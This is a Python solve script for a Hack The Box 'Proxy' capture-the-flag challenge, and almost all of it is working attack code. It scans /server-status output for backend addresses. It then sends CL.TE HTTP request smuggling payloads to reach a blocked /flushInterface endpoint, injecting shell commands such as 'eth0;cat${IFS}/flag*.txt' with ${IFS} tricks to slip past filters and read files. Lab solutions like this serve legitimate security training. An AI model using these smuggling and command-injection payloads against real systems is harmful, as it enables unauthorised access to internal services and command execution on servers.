#!/usr/bin/env python3
"""
Complete solution for HTB Proxy challenge
Tries multiple approaches to bypass restrictions and get the flag
"""
import socket
import sys
import re
import json

class ProxyExploit:
    def __init__(self, proxy_host, proxy_port):
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.backend_port = 5000
        
    def send_request(self, method, path, host_header, body="", headers=None):
        """Send HTTP request through proxy"""
        if headers is None:
            headers = {}
        
        request = f"{method} {path} HTTP/1.1\r\n"
        request += f"Host: {host_header}\r\n"
        
        for key, value in headers.items():
            request += f"{key}: {value}\r\n"
        
        if body:
            if "Content-Length" not in headers:
                request += f"Content-Length: {len(body)}\r\n"
            if "Content-Type" not in headers and body:
                request += "Content-Type: application/json\r\n"
        
        request += "\r\n"
        if body:
            request += body
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.proxy_host, self.proxy_port))
        s.sendall(request.encode())
        
        response = b""
        while True:
            data = s.recv(4096)
            if not data:
                break
            response += data
        s.close()
        
        return response.decode('utf-8', errors='ignore')
    
    def get_server_info(self):
        """Get server information"""
        print("[+] Getting server information...")
        response = self.send_request("GET", "/server-status", "example.com:80")
        print(response)
        
        # Extract hostname and IPs
        hostname_match = re.search(r'Hostname: ([^,]+)', response)
        ip_matches = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', response)
        
        hostname = hostname_match.group(1).strip() if hostname_match else None
        non_localhost_ips = [ip for ip in ip_matches 
                           if not any(ip.startswith(p) for p in ['127.', '172.', '192.', '10.'])]
        
        return hostname, non_localhost_ips, ip_matches
    
    def test_backend_access(self, backend_host):
        """Test if we can access the backend"""
        print(f"\n[*] Testing backend access via {backend_host}:{self.backend_port}")
        response = self.send_request(
            "POST", "/getAddresses",
            f"{backend_host}:{self.backend_port}",
            body="{}"
        )
        
        if "200" in response or "address" in response.lower():
            print(f"[+] Successfully connected to backend!")
            return True
        else:
            print(f"[-] Failed: {response[:200]}")
            return False
    
    def try_flush_interface_direct(self, backend_host, command):
        """Try to access /flushInterface directly (will be blocked)"""
        print(f"\n[*] Attempting direct /flushInterface access...")
        payload = json.dumps({"interface": command})
        response = self.send_request(
            "POST", "/flushInterface",
            f"{backend_host}:{self.backend_port}",
            body=payload
        )
        return response
    
    def try_http_smuggling(self, backend_host, command):
        """Try HTTP request smuggling"""
        print(f"\n[*] Attempting HTTP request smuggling...")
        
        # CL.TE smuggling: Frontend uses Content-Length, backend uses Transfer-Encoding
        inner_request = f"""POST /flushInterface HTTP/1.1\r
Host: {backend_host}:{self.backend_port}\r
Content-Length: {50 + len(command)}\r
Content-Type: application/json\r
\r
{{"interface": "{command}"}}"""
        
        outer_content_length = len(inner_request)
        
        smuggled = f"""POST /test HTTP/1.1\r
Host: {backend_host}:{self.backend_port}\r
Content-Length: {outer_content_length}\r
Transfer-Encoding: chunked\r
\r
0\r
\r
{inner_request}"""
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.proxy_host, self.proxy_port))
        s.sendall(smuggled.encode())
        
        response = b""
        while True:
            data = s.recv(4096)
            if not data:
                break
            response += data
        s.close()
        
        return response.decode('utf-8', errors='ignore')
    
    def exploit(self):
        """Main exploitation function"""
        print(f"[*] Starting exploitation of {self.proxy_host}:{self.proxy_port}\n")
        
        # Step 1: Get server info
        hostname, non_localhost_ips, all_ips = self.get_server_info()
        
        # Step 2: Find a way to access backend
        backend_host = None
        
        if hostname:
            if self.test_backend_access(hostname):
                backend_host = hostname
        
        if not backend_host and non_localhost_ips:
            for ip in non_localhost_ips:
                if self.test_backend_access(ip):
                    backend_host = ip
                    break
        
        if not backend_host:
            print("\n[-] Could not find direct backend access")
            print("[*] Will try HTTP request smuggling with 127.0.0.1 anyway...")
            backend_host = "127.0.0.1"
        
        # Step 3: Try to exploit /flushInterface
        commands = [
            "eth0;cat${IFS}/flag*.txt",
            "eth0;cat$(echo${IFS}/flag*.txt)",
            "eth0;ls${IFS}-la${IFS}/|${IFS}grep${IFS}flag",
            "eth0;find${IFS}/${IFS}-name${IFS}flag*.txt${IFS}-exec${IFS}cat${IFS}{}\\;",
            "eth0;sh${IFS}-c${IFS}'cat${IFS}/flag*.txt'",
        ]
        
        for cmd in commands:
            print(f"\n{'='*60}")
            print(f"[*] Trying command: {cmd}")
            print(f"{'='*60}")
            
            # Try direct access (will likely be blocked)
            response = self.try_flush_interface_direct(backend_host, cmd)
            if "HTB{" in response:
                print(f"\n[+] FLAG FOUND in direct request!")
                flag_match = re.search(r'HTB\{[^}]+\}', response)
                if flag_match:
                    print(f"[+] Flag: {flag_match.group(0)}")
                    return flag_match.group(0)
            
            # Try HTTP request smuggling
            response = self.try_http_smuggling(backend_host, cmd)
            if "HTB{" in response:
                print(f"\n[+] FLAG FOUND in smuggled request!")
                flag_match = re.search(r'HTB\{[^}]+\}', response)
                if flag_match:
                    print(f"[+] Flag: {flag_match.group(0)}")
                    return flag_match.group(0)
            
            print(f"Response preview: {response[:300]}")
        
        print("\n[-] Could not retrieve flag with any method")
        return None

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 solve.py <proxy_host:port>")
        print("Example: python3 solve.py 83.136.255.53:38862")
        sys.exit(1)
    
    target = sys.argv[1].split(':')
    exploit = ProxyExploit(target[0], int(target[1]))
    flag = exploit.exploit()
    
    if flag:
        print(f"\n{'='*60}")
        print(f"[+] SUCCESS! Flag: {flag}")
        print(f"{'='*60}")
    else:
        print("\n[-] Exploitation failed. Try manual testing.")

if __name__ == "__main__":
    main()

